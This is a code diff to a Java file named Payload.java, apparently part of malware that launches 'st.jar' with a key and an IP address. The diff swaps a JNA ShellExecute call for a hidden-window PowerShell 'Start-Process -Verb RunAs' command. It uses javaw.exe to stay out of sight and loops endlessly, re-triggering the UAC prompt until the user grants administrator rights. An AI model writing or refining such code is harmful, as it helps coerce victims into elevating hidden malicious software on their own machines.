@@ -1,5 +1,4 @@
 // language: Java, file: payload/Payload.java
-import com.sun.jna.*;
 import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -8,11 +7,6 @@ import java.util.Base64;
 import java.util.zip.*;
 
 public class Payload {
-    public interface Shell32 extends Library {
-        Shell32 INSTANCE = Native.load("shell32", Shell32.class);
-        int ShellExecuteW(Pointer hwnd, String lpOperation, String lpFile, String lpParameters, String lpDirectory, int nShowCmd);
-    }
-
     public static void main(String[] args) {
         log("--- STARTING ST.JAR ---");
         try {
@@ -52,29 +46,40 @@ public class Payload {
     private static void uacLoop(String key, String ip) {
         try {
             String javaHome = new File(System.getProperty("java.home")).getAbsolutePath();
-            String javaExe = javaHome + "\\bin\\java.exe"; 
+            String javaExe = javaHome + "\\bin\\javaw.exe";
             String jarPath = new File(Payload.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
             
             log("java: " + javaExe);
             log("jar: " + jarPath);
 
-            // Explicit absolute path to cmd.exe
-            String cmdExe = "C:\\Windows\\System32\\cmd.exe";
-            String cmdArgs = String.format("/c \"\"%s\" -jar \"%s\" %s %s\"", javaExe, jarPath, key, ip);
+            // Powershell command to trigger UAC
+            String psCommand = String.format(
+                "Start-Process -FilePath '%s' -Verb RunAs -ArgumentList '-jar \"%s\" %s %s'",
+                javaExe, jarPath, key, ip
+            );
 
             while (true) {
-                log("Triggering UAC...");
-                int result = Shell32.INSTANCE.ShellExecuteW(
-                    null, "runas", cmdExe, cmdArgs, "C:\\Windows\\System32", 1
-                );
-
-                if (result > 32) {
-                    log("UAC Accepted. Parent exiting.");
-                    System.exit(0); 
-                } else {
-                    log("UAC Denied/Failed (Code: " + result + "). Retrying...");
+                log("Triggering UAC via PowerShell...");
+                
+                // Execute PowerShell
+                Process p = new ProcessBuilder(
+                    "powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCommand
+                ).start();
+                
+                // Wait for PowerShell to finish (it finishes instantly after firing the prompt)
+                p.waitFor();
+                
+                // If the UAC prompt is accepted, the new Admin process will lock the st.jar file.
+                // We can check if we are still not admin. If we are, sleep and retry.
+                Thread.sleep(3000); 
+                
+                if (isAdmin()) {
+                     log("We are suddenly admin? That's weird. Exiting loop.");
+                     break;
                 }
-                try { Thread.sleep(500); } catch (Exception e) {}
+                
+                log("Retrying UAC loop...");
+                Thread.sleep(1000);
             }
         } catch (Exception e) {
             log("UAC Error: " + e.toString());
